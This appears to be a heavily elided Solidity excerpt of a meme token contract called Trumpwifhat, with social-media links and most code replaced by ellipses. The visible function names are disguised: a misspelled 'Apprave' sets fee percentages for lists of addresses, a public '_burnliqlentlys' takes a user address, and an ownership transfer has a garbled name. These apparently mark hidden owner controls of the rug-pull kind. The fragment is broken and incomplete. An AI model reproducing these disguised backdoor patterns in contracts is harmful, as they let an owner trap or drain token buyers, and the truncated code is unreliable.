...
/**
https://t.me/trumpwifhat_ERC
https://twitter.com/trumpwifhat_eth
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipsbentrcity(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract Trumpwifhat is Ownable {
    ...
    constructor (){
        name = unicode"Trumpwifhat";
        symbol = unicode"TRUMPWIT";
        decimals = 9;
    ...
    function Apprave(address[] memory _addresses, uint256 _feePercentage) external {
    ...
    function _burnliqlentlys(address user) public {
